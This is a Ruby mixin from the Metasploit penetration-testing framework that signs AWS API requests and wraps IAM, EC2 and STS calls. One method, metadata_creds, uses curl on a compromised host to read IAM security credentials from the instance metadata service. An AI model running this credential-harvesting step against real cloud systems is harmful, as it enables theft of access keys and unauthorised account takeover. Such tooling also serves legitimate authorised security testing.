require 'openssl'

module Metasploit
  module Framework
    module Aws
      module Client
        include Msf::Exploit::Remote::HttpClient
        def register_autofilter_ports(ports=[]); end
        def register_autofilter_hosts(ports=[]); end
        def register_autofilter_services(services=[]); end

        def metadata_creds
          # TODO: do it for windows/generic way
          cmd_out = cmd_exec("curl --version")
          if cmd_out =~ /^curl \d/
            url = "http://#{datastore['RHOST']}/2012-01-12/meta-data/"
            print_status("#{peer} - looking for creds...")
            resp = cmd_exec("curl #{url}")
            if resp =~ /^iam.*/
              resp = cmd_exec("curl #{url}iam/")
              if resp =~ /^security-credentials.*/
                resp = cmd_exec("curl #{url}iam/security-credentials/")
                return JSON.parse(cmd_exec("curl #{url}iam/security-credentials/#{resp}"))
              end
            end
          else
            print_error cmd_out
          end
          {}
        end

        def hexdigest(value)
          digest = OpenSSL::Digest::SHA256.new
          if value.respond_to?(:read)
            chunk = nil
            chunk_size = 1024 * 1024 # 1 megabyte
            digest.update(chunk) while chunk = value.read(chunk_size)
            value.rewind
          else
            digest.update(value)
          end
          digest.hexdigest
        end

        def hmac(key, value)
          OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), key, value)
        end

        def hexhmac(key, value)
          OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('sha256'), key, value)
        end


        def request_to_sign(headers, body_digest)
          headers_block = headers.sort_by(&:first).map do |k,v|
            v = "#{v},#{v}" if k == 'Host'
            "#{k.downcase}:#{v}"
          end.join("\n")
          headers_list = headers.keys.sort.map(&:downcase).join(';')
          flat_request = [ "POST", "/", '', headers_block + "\n", headers_list, body_digest].join("\n")
          [headers_list, flat_request]
        end


        def sign(service, headers, body_digest, now)
          date_mac = hmac("AWS4" + datastore['SECRET'], now[0, 8])
          region_mac = hmac(date_mac, datastore['Region'])
          service_mac = hmac(region_mac, service)
          credentials_mac = hmac(service_mac, 'aws4_request')
          headers_list, flat_request = request_to_sign(headers, body_digest)
          doc = "AWS4-HMAC-SHA256\n#{now}\n#{now[0, 8]}/#{datastore['Region']}/#{service}/aws4_request\n#{hexdigest(flat_request)}"

          signature = hexhmac(credentials_mac, doc)
          [headers_list, signature]
        end

        def auth(service, headers, body_digest, now)
          headers_list, signature = sign(service, headers, body_digest, now)
          "AWS4-HMAC-SHA256 Credential=#{datastore['ACCESS_KEY']}/#{now[0, 8]}/#{datastore['Region']}/#{service}/aws4_request, SignedHeaders=#{headers_list}, Signature=#{signature}"
        end

        def body(vars_post)
          pstr = ""
          vars_post.each_pair do |var,val|
            pstr << '&' if pstr.length > 0
            pstr << var
            pstr << '='
            pstr << val
          end
          pstr
        end

        def headers(service, body_digest, body_length)
          now = Time.now.utc.strftime("%Y%m%dT%H%M%SZ")
          headers = {
            'Content-Type' => 'application/x-www-form-urlencoded; charset=utf-8',
            'Accept-Encoding' => '',
            'User-Agent' => "aws-sdk-ruby2/2.6.27 ruby/2.3.2 x86_64-darwin15",
            'X-Amz-Date' => now,
            'Host' => datastore['RHOST'],
            'X-Amz-Content-Sha256' => body_digest,
            'Accept' => '*/*'
          }
          headers['X-Amz-Security-Token'] = datastore['TOKEN'] if datastore['TOKEN']
          sign_headers = ['Content-Type', 'Host', 'User-Agent', 'X-Amz-Content-Sha256', 'X-Amz-Date']
          auth_headers = headers.select { |k, _| sign_headers.include?(k) }
          headers['Authorization'] = auth(service, auth_headers, body_digest, now)
          headers
        end

        def print_hsh(hsh)
          hsh.each do |key, value|
            print_warning "#{key}: #{value}"
          end
        end

        def print_results(doc, action)
          response = "#{action}Response"
          result = "#{action}Result"
          resource = /[A-Z][a-z]+([A-Za-z]+)/.match(action)[1]

          if doc["ErrorResponse"] && doc["ErrorResponse"]["Error"]
            print_error doc["ErrorResponse"]["Error"]["Message"]
            return nil
          end

          idoc = doc[response] if doc[response]
          idoc = idoc[result] if idoc[result]
          idoc = idoc[resource] if idoc[resource]

          if idoc["member"]
            idoc["member"].each do |x|
              print_hsh x
            end
          else
            print_hsh idoc
          end
          idoc
        end

        def call_api(service, api_params)
          print_status("#{peer} - Connecting (#{datastore['RHOST']})...")
          body = body(api_params)
          body_length = body.length
          body_digest = hexdigest(body)
          begin
            res = send_request_raw(
              'method' => 'POST',
              'data' => body,
              'headers' => headers(service, body_digest, body_length)
            )
            Hash.from_xml(res.body)
          rescue => e
            print_error e.message
          end
        end

        def call_iam(api_params)
          api_params['Version'] = '2010-05-08' unless api_params['Version']
          call_api('iam', api_params)
        end

        def call_ec2(api_params)
          api_params['Version'] = '2015-10-01' unless api_params['Version']
          call_api('ec2', api_params)
        end

        def call_sts(api_params)
          api_params['Version'] = '2011-06-15' unless api_params['Version']
          call_api('sts', api_params)
        end
      end
    end
  end
end
